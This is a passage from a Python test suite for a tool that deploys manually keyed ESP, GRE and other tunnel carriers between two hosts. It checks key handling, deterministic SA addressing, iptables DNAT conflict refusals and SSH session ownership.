        # The third call site carries the flag the other way: a *successful* benchmark writes hosts
        # too, but its anchors are ephemeral, so a measured tunnel must still not become the pair's
        # recorded identity.
        bench_ok_ir = mock_ssh.MockSSHClient(host_role="iran")
        bench_ok_fr = mock_ssh.MockSSHClient(host_role="foreign")
        ok_row = engine.run_single_benchmark(pair, "chisel-wss", dry_run=False, profile="gaming",
                                             ir_runner=bench_ok_ir, fr_runner=bench_ok_fr)
        self.assertFalse(ok_row.get("disqualified"), f"fixture: a healthy plan must measure: {ok_row}")
        self.assertEqual(storage.get_destination_pin(pid, "chisel-wss")["fingerprint"], live_pin,
                         "a benchmark's throwaway anchor overwrote the production pin")

        # A dry-run switchover is the same rule on the other path that writes hosts.
        fa_dry = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=50,
                                          window_seconds=3600)
        preview_swap = fa_dry.execute_failover(dry_pair, "GRE", "chisel-wss",
                                               reason="dry-run preview of a switchover", dry_run=True,
                                               ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
                                               fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertTrue(preview_swap.get("success"), f"fixture: {preview_swap}")
        self.assertIsNone(storage.get_destination_pin(dry_pid, "chisel-wss"),
                          "a previewed switchover recorded an identity for nothing")

        # And its counterpart, without which `record=not dry_run` on this path is untested: a switchover
        # that really runs is the event after which the pair's new tunnel exists, so its pin must be
        # remembered. The gate fires at Stage 1b, so the assertion holds even if a later stage fails -
        # the result is printed rather than assumed.
        swap = fa_dry.execute_failover(dry_pair, "GRE", "chisel-wss",
                                       reason="real switchover onto an anchored transport",
                                       dry_run=False,
                                       ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
                                       fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertIsNotNone(storage.get_destination_pin(dry_pid, "chisel-wss"),
                             f"a performed switchover left no pin: {swap}")

        # What a dry run must NOT lose is the refusal: previewing a broken generator is precisely when
        # an operator wants the gate to speak.
        protocols.generate_deployment = lambda *a, **k: drop_flag(real_dep(*a, **k), "--tls-ca")
        try:
            with self.assertRaises(ValueError) as dry_refusal:
                engine.deploy_tunnel(pair=dry_pair, choice="chisel-wss", dry_run=True,
                                     force_confirmed=True,
                                     ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
                                     fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
            self.assertIn("no-anchor-in-client-config", str(dry_refusal.exception),
                          "a dry run that stops refusing is a dry run that hides the defect")
        finally:
            protocols.generate_deployment = real_dep


    def test_68_the_esp_carrier_is_keyed_by_hand_and_keeps_what_it_keys_to_itself(self):
        """#40 Acceptance Test: the manually keyed ESP (IP proto 50) carrier that un-refuses REALITY.

        The carrier witness measured that TCP, UDP and ICMP never arrive between these two hosts while
        IP protocols 47, 50 and 51 do - and UDP 500/4500 are inside the dropped set, so IKE is not
        available and every SA has to be keyed by hand. That makes this generator the first in the
        product whose *secret material is the configuration file*, which is what most of this test
        checks: the SA keys go to one 0600 batch file per host and nowhere else, they are not re-issued
        on retry, and nothing about them reaches a command line, a unit file, a report row or a plan's
        own metadata.

        The determinism half is equally load-bearing. failover.plan_for(current_protocol) regenerates
        the old plan purely in order to tear it down, and deploy_tunnel's rollback does the same, so SPI
        and reqid must be derived from the pair - if they were random, a regenerated teardown would name
        SAs that were never installed and leave the real ones in the kernel. The keys must still rotate,
        or every deploy would reuse them.
        """
        ir_pub, fr_pub, frontend, pid = "198.51.100.10", "203.0.113.20", 9443, 77
        _KEY = re.compile(r"0x([0-9a-f]{40})")
        plan = protocols.generate_deployment("ESP", pid, ir_pub, fr_pub, frontend)
        meta = plan["esp"]
        ir_batch = plan["iran_files"][meta["batch_ir"]]
        fr_batch = plan["foreign_files"][meta["batch_fr"]]
        ir_unit = plan["iran_files"][f"/etc/systemd/system/best-tunnel-prod-p{pid}-esp.service"]
        keys = set(_KEY.findall(ir_batch)) | set(_KEY.findall(fr_batch))

        # 1. Two distinct SA keys, and each host installs both - it transmits on one and receives on the
        #    other, which is what "manually keyed" means here and why a one-sided deploy leaves the
        #    carrier dark rather than half-encrypted.
        self.assertEqual(len(keys), 2, "an ESP carrier is a pair of SAs, each with its own key")
        self.assertNotEqual(meta["spi_ir2fr"], meta["spi_fr2ir"])
        for batch in (ir_batch, fr_batch):
            for spi in (meta["spi_ir2fr"], meta["spi_fr2ir"]):
                self.assertIn(f"proto esp spi {spi}", batch)
        # Unquoted on purpose: `ip -batch` splits on whitespace itself, and a quote-naive splitter would
        # put the quote characters inside the algorithm token.
        self.assertIn(f"aead {protocols.ESP_ALGO} 0x", ir_batch)
        self.assertNotIn(f'"{protocols.ESP_ALGO}"', ir_batch)

        # 1b. The exact grammar is what the installed iproute2 was measured against, not what the how-tos
        #     write. Two separate live failures collapse into one line here: `rfc4106(gcm16)` is not a
        #     registered algorithm name on these kernels, and omitting the ICV length is refused by the
        #     argument parser outright, so a batch file in either spelling installs zero SAs while the unit
        #     still reports the batch's exit status. Pinning the spelling is what keeps a future "cleanup"
        #     of the algo constant from silently re-breaking the carrier.
        for batch in (ir_batch, fr_batch):
            for line in batch.splitlines():
                if " aead " not in line:
                    continue
                tail = line.split(" aead ", 1)[1]
                algo, keymat, icv = tail.split()
                self.assertEqual(algo, "rfc4106(gcm(aes))",
                                 f"an AEAD name the kernel does not register: {algo}")
                self.assertEqual(len(keymat), 2 + 2 * protocols.ESP_KEY_BYTES,
                                 "RFC 4106 wants a 16-byte AES key plus a 4-byte salt, as hex with 0x")
                self.assertEqual(int(icv), protocols.ESP_ICV_BITS,
                                 "the ICV length is mandatory and expressed in bits")
                self.assertIn(int(icv), (96, 104, 112, 120, 128),
                              "RFC 4106 permits only these GCM tag lengths")
        self.assertEqual((protocols.ESP_ALGO, protocols.ESP_ICV_BITS),
                         ("rfc4106(gcm(aes))", 128),
                         "the ESP constants drifted away from the grammar measured on both hosts")

        # 1c. The algorithm name carries parentheses, which are shell metacharacters, and every `run()` in
        #     this product goes through a remote shell. The batch files are the only place it may appear;
        #     a name in a command line is a `syntax error near unexpected token \`(\`` that never reaches
        #     `ip` at all.
        for cmd in plan["iran_cmds"] + plan["foreign_cmds"] + plan["teardown_iran"] + plan["teardown_foreign"]:
            self.assertNotIn(protocols.ESP_ALGO, cmd,
                             f"the AEAD name cannot survive a shell: {cmd[:60]}")
        self.assertIn("aead", ir_batch + fr_batch)

        # 2. The keys exist only in the batch files. Everything else about this plan is safe to log,
        #    which is what lets the unit reference a path instead of a value: systemd writes the
        #    expanded ExecStart into the journal, and this product reads journals back into rows.
        without_batches = dict(plan)
        for side in ("iran_files", "foreign_files"):
            without_batches[side] = {p: c for p, c in plan[side].items() if not p.endswith(".batch")}
        rest_blob = json.dumps(without_batches, default=str)
        for key in keys:
            self.assertNotIn(key, ir_unit, "an SA key in a unit is an SA key in the journal")
            self.assertNotIn(key, meta.__repr__(), "the carrier metadata sub-dict must stay report-safe")
            self.assertNotIn(key, rest_blob, "ESP key material reached somewhere a plan gets printed")
        for idx, cmd in enumerate(plan["iran_cmds"] + plan["foreign_cmds"]
                                  + plan["teardown_iran"] + plan["teardown_foreign"]):
            for key in keys:
                self.assertNotIn(key, cmd,
                                 f"ESP key material in remote command #{idx} of the plan (not printed, "
                                 f"same reason as above)")
        self.assertIn(f"ip -batch {meta['batch_ir']}", ir_unit)
        self.assertIn("mkdir -p /etc/best-tunnel/esp", "\n".join(plan["iran_cmds"]))

        # 3. Deterministic addressing, rotating secrets, and a teardown that still names what it installed.
        again = protocols.generate_deployment("ESP", pid, ir_pub, fr_pub, frontend)
        self.assertEqual({k: meta[k] for k in ("iface", "reqid", "tun_ir", "tun_fr", "spi_ir2fr",
                                               "spi_fr2ir", "batch_ir", "batch_fr")},
                         {k: again["esp"][k] for k in ("iface", "reqid", "tun_ir", "tun_fr", "spi_ir2fr",
                                                      "spi_fr2ir", "batch_ir", "batch_fr")})
        again_ir_batch = again["iran_files"][meta["batch_ir"]]
        self.assertNotEqual(set(_KEY.findall(again_ir_batch)), keys,
                            "a regenerated ESP plan reused its SA keys")
        tear = "\n".join(plan["teardown_iran"] + plan["teardown_foreign"])
        for spi in (meta["spi_ir2fr"], meta["spi_fr2ir"]):
            self.assertIn(f"proto esp spi {spi}", tear,
                          "a teardown that does not name the installed SPI leaves the SA in the kernel")
            self.assertTrue(int(spi, 16) & 0x80000000,
                            "RFC 4303 reserves the low SPI range for testing; derived values stay out")
        self.assertNotIn("flush", tear,
                         "`ip xfrm ... flush` is host-wide: it would delete SAs this pair does not own")
        self.assertGreater(meta["reqid"], 0, "reqid 0 means unset to the kernel")

        # 4. The per-host `dir out` policy is the one place the two hosts genuinely differ. Both holding
        #    the same keying material used to mean both emitting the same template, which made Foreign
        #    send ESP with Iran's address as its outer source - martian-dropped, so the carrier reported
        #    "deployed" and stayed dark.
        pol_ir = [l for l in ir_batch.splitlines() if "dir out" in l]
        pol_fr = [l for l in fr_batch.splitlines() if "dir out" in l]
        self.assertEqual(len(pol_ir), 1, "exactly one outbound policy per host")
        self.assertEqual(len(pol_fr), 1, "exactly one outbound policy per host")
        self.assertIn(f"tmpl src {ir_pub} dst {fr_pub}", pol_ir[0])
        self.assertIn(f"tmpl src {fr_pub} dst {ir_pub}", pol_fr[0])
        self.assertIn(f"src {meta['tun_ir']} dst {meta['tun_fr']}", pol_ir[0])
        self.assertIn(f"src {meta['tun_fr']} dst {meta['tun_ir']}", pol_fr[0])
        # 5. The inbound policy, asserted as present. An earlier revision of this block asserted the
        #    opposite - `assertNotIn("dir in", ...)`, justified by `disable_policy=1` on the interface - and
        #    that is a test locking in a belief about the kernel that had never been measured. It was
        #    measured on 2026-10-11 and it was wrong: with `dir out` only, `/proc/net/xfrm_stat` reported
        #    `XfrmInNoPols` climbing on both hosts, i.e. the peer decrypted the packet and then discarded
        #    it at the inbound policy check. A `dir in` policy without a template also failed (rx=0), so
        #    both halves are required. test_72 owns the detailed shape; this block keeps the invariant that
        #    belongs to *this* test's subject - that the two hosts' policies are mirrors, not copies.
        for label, batch, own_inner, peer_inner, own_outer, peer_outer in (
                ("iran", ir_batch, meta["tun_ir"], meta["tun_fr"], ir_pub, fr_pub),
                ("foreign", fr_batch, meta["tun_fr"], meta["tun_ir"], fr_pub, ir_pub)):
            in_pol = [l for l in batch.splitlines() if "dir in" in l]
            self.assertEqual(len(in_pol), 1, f"{label}: exactly one inbound policy per host")
            self.assertIn(f"src {peer_inner} dst {own_inner} dir in", in_pol[0],
                          f"{label}: the inbound selector is not the mirror of its outbound one")
            self.assertIn(f"tmpl src {peer_outer} dst {own_outer}", in_pol[0],
                          f"{label}: the inbound template repeats the local outer address, so it names "
                          f"the SA that this host transmits on rather than the one that carries arrivals")

        # 5. Geometry: one MTU below the measured eth0, and addresses that let both carriers coexist.
        self.assertEqual(meta["iface"], "espp77")
        self.assertEqual(protocols.carrier_iface("ESP", pid, "bench"), "espp77b")
        self.assertEqual((meta["tun_ir"], meta["tun_fr"]), ("10.12.87.1", "10.12.87.2"))
        octets = {protocols.carrier_inner_pair(p, pid, ns)[0].rsplit(".", 1)[0]
                  for p in ("GRE", "ESP") for ns in ("prod", "bench")}
        self.assertEqual(len(octets), 4, f"carrier /30s must not overlap: {sorted(octets)}")
        self.assertEqual(meta["mtu"], protocols.ESP_MTU)
        self.assertLess(meta["mtu"], 1400,
                        "Iran's eth0 is 1400 (measured); there is no PMTU here because ICMP is blocked, "
                        "so the envelope has to be sized by hand")

        # 6. The gate: an encrypted envelope is the answer to the objection the refusal raises, so a
        #    declared 'esp' lifts it and a declared or inferred 'gre' keeps it.
        tun_ir, tun_fr = meta["tun_ir"], meta["tun_fr"]
        esp_pair = {"id": pid, "name": "esp_gate", "frontend": frontend, "underlay_carrier": "esp",
                    "iran": {"host": ir_pub, "port": 22, "dial_host": tun_ir},
                    "foreign": {"host": fr_pub, "port": 22, "dial_host": tun_fr}}
        self.assertEqual(protocols.carrier_kind(esp_pair), "esp",
                         "the declaration has to beat the dial_host inference")
        self.assertEqual(engine.carrier_camouflage_block(esp_pair, "singbox-vless-reality"), "",
                         "REALITY on an ESP underlay is the whole point of building one")
        for carrier_in, expect in (({"underlay_carrier": "gre"}, "gre"),
                                   ({}, "gre"), ({"underlay_carrier": "esp"}, "esp"),
                                   ({"underlay_carrier": "ESP"}, "esp")):
            row = {"id": pid, "underlay_carrier": carrier_in.get("underlay_carrier", ""),
                   "iran_dial_host": tun_ir, "foreign_dial_host": tun_fr}
            self.assertEqual(protocols.carrier_kind(row), expect,
                             f"a flat SQLite row must resolve the same as a nested spec: {expect}")
        self.assertEqual(protocols.carrier_kind({"iran": {}, "foreign": {}}), "public")
        for other in ("chisel-wss", "wstunnel-v10", "GRE", "ESP", "xray-reverse"):
            self.assertEqual(engine.carrier_camouflage_block(esp_pair, other), "",
                             f"{other} was never gated on this carrier")
        # A carrier dials its own outer endpoint; the overlay transport dials the inner address.
        self.assertEqual(protocols.dial_address({"host": ir_pub, "dial_host": tun_ir}, "ESP"), ir_pub)
        self.assertEqual(protocols.dial_address({"host": ir_pub, "dial_host": tun_ir}, "chisel-wss"), tun_ir)

        # 7. Durable topology: a preview writes nothing, a deploy writes the declaration and the inner
        #    addresses, and the value a *later process* reads off the disk is the one that un-arms the
        #    gate. Retraction is asserted too, because a stale 'esp' would un-refuse a pair whose
        #    envelope was torn down with the attempt.
        row_pid = storage.add_pair(name=f"esp_carrier_{int(time.time() * 1000)}", iran_host=ir_pub,
                                   foreign_host=fr_pub, frontend_port=frontend)
        self.addCleanup(storage.delete_pair, row_pid)
        db_pair = {"id": row_pid, "name": "esp_carrier", "frontend": frontend,
                   "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}
        stored = storage.get_pair(row_pid)
        self.assertEqual(stored["underlay_carrier"], "",
                         "a fresh pair must arrive undeclared, so the fail-closed inference applies")
        preview = engine.deploy_tunnel(pair=db_pair, choice="ESP", dry_run=True, force_confirmed=True,
                                       ir_runner=RecordingRunner(host_role="iran"),
                                       fr_runner=RecordingRunner(host_role="foreign"))
        self.assertTrue(preview["ok"], f"fixture: {preview}")
        self.assertEqual(storage.get_pair(row_pid)["underlay_carrier"], "",
                         "a previewed carrier declared a topology nothing deployed")
        live_ir, live_fr = RecordingRunner(host_role="iran"), RecordingRunner(host_role="foreign")
        dep = engine.deploy_tunnel(pair=db_pair, choice="ESP", dry_run=False, force_confirmed=True,
                                   ir_runner=live_ir, fr_runner=live_fr)
        self.assertTrue(dep["ok"], f"fixture: {dep}")
        row = storage.get_pair(row_pid)
        self.assertEqual(row["underlay_carrier"], "esp")
        self.assertEqual((row["iran_dial_host"], row["foreign_dial_host"]),
                         protocols.carrier_inner_pair("ESP", row_pid),
                         "the carrier writes the inner addresses its own overlay has to dial")
        # The keys this deploy actually installed, taken from the file the runner was handed - and the
        # assertion that none of them ever appears in a command. Staging used to be a `cat > path`
        # heredoc, which put every one of these 40 hex characters in the argv of a remote `sh -c`,
        # readable in /proc/<pid>/cmdline; the writer now sends the payload over the channel's stdin,
        # so the only thing this pair of hosts ever sees in a command line is the path.
        staged_batch = live_ir.state["files"][f"/etc/best-tunnel/esp/prod-p{row_pid}-iran.batch"]
        deployed_keys = set(_KEY.findall(staged_batch))
        self.assertEqual(len(deployed_keys), 2,
                         "fixture: the batch file the host received holds two SA keys")
        issued = live_ir.issued() + "\n" + live_fr.issued()
        self.assertIsNone(_KEY.search(issued),
                          "a deploy issued a command line carrying what looks like SA key material "
                          f"({len(_KEY.findall(issued))} such value(s)); the values are not printed here "
                          "because a failing test must not become a leak")
        audited = [a for a in storage.get_audit_logs(300)
                   if a.get("action") == "UNDERLAY" and a.get("pair_id") == row_pid]
        self.assertTrue(audited, "declaring a carrier is a topology change and has to leave a trail")
        self.assertIn("esp", audited[0]["details"])
        self.assertNotIn(row["iran_dial_host"], audited[0]["details"],
                         "the audit line names the carrier, never the addresses it provides")

        # The rebuilt-from-disk path: this is the shape a monitor pass or a failover sees after a
        # restart, and it is the reason the column exists rather than an in-memory flag.
        from_disk = [p for p in failover_monitor.pairs_from_storage() if p["id"] == row_pid]
        self.assertEqual(len(from_disk), 1)
        self.assertEqual(protocols.carrier_kind(from_disk[0]), "esp")
        self.assertEqual(engine.carrier_camouflage_block(from_disk[0], "singbox-vless-reality"), "")
        engine.retract_carrier(row_pid, "ESP", dry_run=True)
        self.assertEqual(storage.get_pair(row_pid)["underlay_carrier"], "esp",
                         "a dry-run retraction still erased a live declaration")
        engine.retract_carrier(row_pid, "ESP", dry_run=False)
        after = storage.get_pair(row_pid)
        self.assertEqual((after["underlay_carrier"], after["iran_dial_host"], after["foreign_dial_host"]),
                         ("", "", ""), "retracting the envelope must retract the addresses it provided")
        self.assertEqual(protocols.carrier_kind(after), "public",
                         "an undeclared pair with no dial hosts is on the public path again")
        with self.assertRaises(ValueError):
            storage.set_pair_underlay(row_pid, "ipsec")
        self.assertFalse(storage.set_pair_underlay(row_pid + 5000, "esp"),
                         "declaring a carrier on a pair that does not exist is not a success")

        # 8. The census this suite learned the hard way: a pair dict built anywhere else than
        #    dashboard.pair_for_operations silently falls back to the inference, so every site that
        #    assembles an operational pair spec has to carry the declaration with it.
        sites = []
        for fname in ("dashboard.py", "failover_monitor.py", "engine.py", "failover.py", "storage.py"):
            with open(os.path.join(os.path.dirname(mock_ssh.__file__), fname),
                      encoding="utf-8") as fh:
                lines = fh.read().splitlines()
            for i, line in enumerate(lines):
                if re.search(r'"iran":\s*(pair_side_spec\(|\{)', line):
                    window = "\n".join(lines[max(0, i - 10):i + 10])
                    sites.append((fname, i + 1, "underlay_carrier" in window))
        self.assertGreaterEqual(len(sites), 3, f"the census found nothing to check: {sites}")
        for fname, ln, has_decl in sites:
            self.assertTrue(has_decl,
                            f"{fname}:{ln} builds an operational pair dict without declaring "
                            f"underlay_carrier, so the gate would infer 'gre' for it")

    def test_69_a_second_carrier_on_an_occupied_frontend_refuses_before_it_stages_anything(self):
        """#40 Acceptance Test: a carrier's frontend is the rule that answers it first, not the rule added last.

        Found while preparing the live ESP witness on a pair that still held its GRE carrier: both
        generators append `-A PREROUTING -p tcp --dport F -j DNAT --to-destination <inner peer>:F`
        (protocols.py:357 and :598), iptables evaluates a chain in order, and the verification loop tested
        only `f"--dport {frontend}" in o_nat`. On that pair the test was already true of GRE's rule, so an
        ESP deploy would have verified, called `declare_carrier`, and left REALITY's inbound traffic
        entering proto 47 - the exact cleartext envelope the carrier gate was built to refuse, reached
        through rule order instead of through the declaration, and invisible to every check a carrier can
        make about itself: its SAs install, its inner ping answers, its unit is active.

        So the check is about the destination now, and it runs as a pre-flight too, before a port is
        released or a file is staged - which is why the largest part of this test is the negative
        assertion that a refusal leaves the mock hosts untouched. The mock had to learn the shape to
        express it: `state["prerouting"]` is armed here and nowhere else, so an un-armed deploy cannot
        invent a conflict and no existing test changes behaviour.
        """
        def dnat(pair_ns, proto, port, inner, match="tcp", quoted=False):
            """One `iptables -S PREROUTING` line, in the shape the live hosts actually print.

            Two things here are measured rather than recalled (scratch/witness_esp_conflict.out): the
            comment is printed *unquoted* by Debian 13's iptables-nft - the first version of the conflict
            parser looked for `--comment "..."`, matched nothing, and reported the live GRE rule as
            "unlabelled" - and the module order differs from the `-A` form the generator emits
            (`-p tcp -m tcp --dport F -m comment ...`), which is why the parser is a set of substring
            tests on the line rather than one pattern over it. The comment itself is derived from
            `safety.generate_firewall_comment` and never typed: this whole test is about matching a rule
            that *another* deploy installed.
            """
            cmt = safety.generate_firewall_comment(f"{pair_ns}", proto)
            cmt = f'"{cmt}"' if quoted else cmt
            return (f"-A PREROUTING -p {match} -m {match} --dport {port} -m comment --comment {cmt} "
                    f"-j DNAT --to-destination {inner}:{port}")

        gre_cmt_1 = safety.generate_firewall_comment("1-prod", "GRE")
        esp_cmt_9 = safety.generate_firewall_comment("9-prod", "ESP")
        chain = "\n".join([
            "-P PREROUTING ACCEPT",
            dnat("1-prod", "GRE", 443, "10.10.11.2"),
            dnat("1-prod", "GRE", 443, "10.10.11.2", match="udp"),
            dnat("9-prod", "ESP", 8443, "10.12.99.2"),
            dnat("13-prod", "ESP", 4433, "10.13.99.2"),
            "-A PREROUTING -p tcp -m tcp --dport 8080 -j REDIRECT --to-ports 3128",
        ]) + "\n"

        # 1. The shadow, measured as a fact about this chain rather than about the code that wrote it.
        #    `--dport 443` is present, so the check this replaces was satisfied by GRE's rule and would
        #    have certified an ESP carrier that never saw a packet.
        self.assertIn("--dport 443 ", chain)
        self.assertEqual(engine.carrier_dnat_conflict(chain, 443, "10.10.11.2"), "",
                         "the carrier that owns the rule must not be refused by its own rule")
        conflict = engine.carrier_dnat_conflict(chain, 443, "10.12.87.2")
        self.assertIn(gre_cmt_1, conflict,
                      "the refusal has to name whose rule is in force, or the operator has one chain "
                      "and no explanation")
        self.assertIn("10.10.11.2", conflict, "an inner carrier address is identity, not a secret")
        # A port prefix is not a port: `--dport 443` must not match the 4433 rule, and a carrier deploying
        # onto a port another carrier holds has to be told about the rule that beat it to the packet.
        self.assertEqual(engine.carrier_dnat_conflict(chain, 4433, "10.13.99.2"), "",
                         "the 4433 DNAT is the carrier's own, so the substring match must not fire")
        self.assertIn(esp_cmt_9, engine.carrier_dnat_conflict(chain, 8443, "10.12.87.2"))
        self.assertIn("10.13.99.2", engine.carrier_dnat_conflict(chain, 4433, "10.12.13.2"))
        self.assertEqual(engine.carrier_dnat_conflict(chain, 8080, "10.12.87.2"), "",
                         "a REDIRECT is not a DNAT and does not occupy a carrier's frontend")
        # Both comment spellings have to name their owner, and the live one is the unquoted form. The text
        # below is copied verbatim out of the refused pair's own chain (scratch/witness_esp_conflict.out),
        # because that is the shape that made the first version of the parser report "unlabelled": it
        # looked for `--comment "..."` and Debian 13's iptables-nft does not print the quotes.
        live_line = ("-A PREROUTING -p tcp -m tcp --dport 443 -m comment "
                     "--comment best-tunnel-1-prod-GRE -j DNAT --to-destination 10.10.11.2:443")
        for rule_line, why in ((live_line, "the form the live host prints"),
                               (dnat("1-prod", "GRE", 443, "10.10.11.2", quoted=True),
                                "the quoted form a legacy iptables prints")):
            desc = engine.carrier_dnat_conflict(rule_line + "\n", 443,
                                                protocols.carrier_inner_pair("ESP", 1, "prod")[1])
            self.assertIn(gre_cmt_1, desc, f"the owner was lost in {why}: {desc}")
            self.assertNotIn("unlabelled", desc)
        # What the mask is for: an operator's own rule pointing at a routable address is named by the
        # refusal without the address itself being printed.
        routable = engine.carrier_dnat_conflict(
            "-A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 203.0.113.77:443\n", 443,
            "10.12.87.2")
        self.assertIn("[addr]", routable)
        self.assertNotIn("203.0.113.77", routable)
        self.assertEqual(engine.carrier_dnat_conflict("", 443, "10.12.87.2"), "",
                         "an empty or unread chain is not a conflict; the deploy must still be able to "
                         "proceed and fail loudly at verification if the rule is really missing")

        # 2. The deploy-level refusal, and the proof that it precedes the deploy.
        ir_pub, fr_pub = "198.51.100.10", "203.0.113.20"
        row_pid = storage.add_pair(name=f"carrier_front_{int(time.time() * 1000)}", iran_host=ir_pub,
                                   foreign_host=fr_pub, frontend_port=443)
        self.addCleanup(storage.delete_pair, row_pid)
        db_pair = {"id": row_pid, "name": "carrier_front", "frontend": 443,
                   "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}
        esp_inner = protocols.carrier_inner_pair("ESP", row_pid, "prod")[1]
        own_gre_rule = dnat(f"{row_pid}-prod", "GRE", 443,
                            protocols.carrier_inner_pair("GRE", row_pid, "prod")[1])
        gre_cmt = safety.generate_firewall_comment(f"{row_pid}-prod", "GRE")
        shadow_desc = engine.carrier_dnat_conflict(own_gre_rule, 443, esp_inner)
        self.assertIn(gre_cmt, shadow_desc,
                      "fixture: this chain really does shadow the ESP carrier about to be deployed")
        blocked_ir, blocked_fr = RecordingRunner(host_role="iran"), RecordingRunner(host_role="foreign")
        blocked_ir.state["prerouting"] = [own_gre_rule]
        with self.assertRaises(ValueError) as shadow:
            engine.deploy_tunnel(pair=db_pair, choice="ESP", dry_run=False, force_confirmed=True,
                                 ir_runner=blocked_ir, fr_runner=blocked_fr)
        self.assertIn("NOT_MEASURABLE", str(shadow.exception))
        self.assertIn(gre_cmt, str(shadow.exception))
        for runner, role in ((blocked_ir, "iran"), (blocked_fr, "foreign")):
            self.assertEqual(runner.state["files"], {},
                             f"{role}: a refused carrier deploy staged files on the host")
            self.assertEqual(runner.state["services"], {},
                             f"{role}: a refused carrier deploy enabled a unit")
            self.assertNotIn("xfrm", runner.issued(),
                             f"{role}: a refused carrier deploy touched the kernel's SAs")
            self.assertNotIn("-A PREROUTING", runner.issued(),
                             f"{role}: a refused carrier deploy installed its own DNAT")
            self.assertNotIn("systemctl enable", runner.issued())
        self.assertEqual(blocked_ir.state["prerouting"], [own_gre_rule],
                         "the refusal issued a read of the chain, not a rewrite of it")
        self.assertEqual(storage.get_pair(row_pid)["underlay_carrier"], "",
                         "a refused deploy must leave the pair's topology as the operator set it")

        # 3. The same pair, a frontend nobody occupies: the deploy proceeds, and its own rule is not a
        #    conflict for it. The ESP carrier installed here declares itself, so the retraction at the end
        #    is the negative assertion that the declaration is reversible.
        free = dict(db_pair, frontend=8443)
        own_esp_rule = dnat(f"{row_pid}-prod", "ESP", 8443, esp_inner)
        esp_cmt = safety.generate_firewall_comment(f"{row_pid}-prod", "ESP")
        ok_ir = RecordingRunner(host_role="iran")
        ok_ir.state["prerouting"] = [own_esp_rule]
        good = engine.deploy_tunnel(pair=free, choice="ESP", dry_run=False, force_confirmed=True,
                                    ir_runner=ok_ir,
                                    fr_runner=RecordingRunner(host_role="foreign"))
        self.assertTrue(good["ok"], f"fixture: a carrier deploying onto its own rule must pass: {good}")
        self.assertEqual(storage.get_pair(row_pid)["underlay_carrier"], "esp")
        # Symmetry, because the hazard is not one-directional: a GRE carrier aimed at a frontend an ESP
        # rule already owns has to refuse for the same reason.
        gre_pair = {"id": row_pid, "name": "carrier_front", "frontend": 8443,
                    "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}
        gre_ir, gre_fr = RecordingRunner(host_role="iran"), RecordingRunner(host_role="foreign")
        gre_ir.state["prerouting"] = [own_esp_rule]
        with self.assertRaises(ValueError) as back:
            engine.deploy_tunnel(pair=gre_pair, choice="GRE", dry_run=False, force_confirmed=True,
                                 ir_runner=gre_ir, fr_runner=gre_fr)
        self.assertIn(esp_cmt, str(back.exception))
        self.assertEqual(gre_ir.state["files"], {}, "the mirrored refusal staged a GRE carrier anyway")
        engine.retract_carrier(row_pid, "ESP", dry_run=False)

        # 4. The live path is a `run()` of one exact string, so the command both reads are pinned here: a
        #    caller that renamed it would silently read the empty chain the mock returns by default and
        #    let every carrier deploy through.
        with open(os.path.join(os.path.dirname(mock_ssh.__file__), "engine.py"),
                  encoding="utf-8") as fh:
            src = fh.read()
        self.assertEqual(src.count('run("iptables -t nat -S PREROUTING"'), 2,
                         "the pre-flight and the verification must read the same chain, and both reads "
                         "are the string the mock is armed with")
        self.assertIn("def carrier_dnat_conflict", src)
        self.assertIn("CARRIER_DNAT_CONFLICT", src)

    def test_70_a_caller_hands_over_a_session_and_gets_it_back_usable(self):
        """#40 Acceptance Test: a helper closes only the sessions it opened, on every exit path.

        Measured rather than reasoned, and the measurement cost a secret. While the live ESP witness ran,
        `deploy_tunnel`'s teardown closed both runners unconditionally, so the caller's session died with
        the deploy. The witness's *next* command then raised `TransientTransportError`, whose message
        names the server address, and because that run was piped `2>&1 | tee` into an evidence file the
        address reached a file inside the repository. The deploy had reported `ok=True`, so the leak was
        caught by the repo-wide byte census and not by the failure - which is why the control here is the
        state of a session after the call rather than the text of an error.

        Both directions are asserted. "Never close" would fix the witness and leak one SSH session per
        protocol row instead, so the invariant is ownership: what this call opened is gone when it
        returns, and what it was handed still answers.
        """
        ir_pub, fr_pub = "198.51.100.10", "203.0.113.20"
        seq = []

        def fresh_pair(frontend):
            seq.append(len(seq) + 1)
            pid = storage.add_pair(name=f"sess_{int(time.time() * 1000)}_{len(seq)}", iran_host=ir_pub,
                                   foreign_host=fr_pub, frontend_port=frontend)
            self.addCleanup(storage.delete_pair, pid)
            return {"id": pid, "name": "sess", "frontend": frontend,
                    "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}

        def answering(runner):
            """A handed-over session has to be usable, not merely flagged open: `MockSSHClient.run` on a
            closed transport raises, so issuing a command is the assertion and the reply is the proof."""
            code, out, _ = runner.run("uname -a")
            self.assertEqual(code, 0)
            self.assertIn("Debian", out)

        # 1. Both entry points the live witness uses, each handed both sessions.
        for label, invoke in (
                ("deploy_tunnel", lambda p, ir, fr: engine.deploy_tunnel(
                    pair=p, choice="GRE", dry_run=False, force_confirmed=True,
                    ir_runner=ir, fr_runner=fr)["ok"]),
                ("run_single_benchmark", lambda p, ir, fr: engine.run_single_benchmark(
                    p, "GRE", dry_run=False, ir_runner=ir, fr_runner=fr)["disqualified"])):
            ir_c, fr_c = RecordingRunner(host_role="iran"), RecordingRunner(host_role="foreign")
            out = invoke(fresh_pair(8455), ir_c, fr_c)
            if label == "deploy_tunnel":
                self.assertTrue(out, f"fixture: {label} did not deploy")
            else:
                self.assertFalse(out, f"fixture: {label} returned a disqualified row")
            for runner, role in ((ir_c, "iran"), (fr_c, "foreign")):
                self.assertTrue(runner.connected,
                                f"{label} closed the {role} session it was handed")
                answering(runner)

        # 2. The mirrored half, on the same two entry points with no runner passed: a session this call
        #    opened must not outlive it. Asserted as a count and a state, because a leaked transport is
        #    invisible in the row the function returns.
        real_factory = engine.get_ssh_runner
        for label, invoke in (
